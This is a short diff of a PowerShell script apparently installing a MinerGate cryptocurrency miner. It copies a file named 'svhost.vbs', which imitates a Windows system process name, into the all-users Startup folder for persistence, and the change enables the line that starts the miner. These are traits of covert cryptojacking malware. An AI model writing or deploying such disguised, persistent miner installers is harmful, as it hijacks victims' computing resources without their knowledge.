@@ -65,6 +65,6 @@ Register-ScheduledTask -Action $KillAction -Trigger $KillTrigger -TaskName "Kill
 
 Copy-Item C:\Miner\MinerGate-cli-4.04-win64\svhost.vbs "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
 
-#.\Startup.vbs #Starts the Miner
+.\Startup.vbs #Starts the Miner
 
 }
